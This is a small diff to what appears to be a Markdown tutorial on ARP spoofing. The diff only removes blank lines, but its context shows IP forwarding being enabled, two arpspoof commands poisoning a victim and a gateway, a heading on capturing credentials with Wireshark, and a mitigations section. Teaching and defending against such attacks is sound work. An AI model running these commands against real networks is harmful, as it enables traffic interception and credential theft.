@@ -90,12 +90,9 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 arpspoof -i eth0 -t [victim_ip] [gateway_ip]
 arpspoof -i eth0 -t [gateway_ip] [victim_ip]
 
-<br/>
 
 ### 3. Capture traffic (e.g., credentials) with Wireshark
-
 <br/>
-
 
 ### 🔒 Optional Mitigations (Proof-of-Concept)
 #### Block spoofed traffic using iptables
